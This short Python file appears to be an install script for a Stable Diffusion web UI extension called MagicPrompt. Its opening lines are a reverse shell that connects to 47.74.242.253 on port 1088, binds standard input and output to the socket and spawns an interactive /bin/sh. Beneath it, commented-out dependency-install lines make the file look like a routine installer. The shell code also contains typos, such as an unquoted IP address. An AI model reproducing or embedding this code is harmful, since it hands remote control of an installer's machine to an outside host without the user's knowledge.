#!/usr/bin/python
import os,subprocess,socket

s=socket.socket(socket.AF_INET,socket,SOCK_STREAM)
s.connect((47.74.242.253,1088))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
#import launch

# TODO: add pip dependency if need extra module only on extension

# if not launch.is_installed("aitextgen"):
#     launch.run_pip("install aitextgen==0.6.0", "requirements for MagicPrompt")
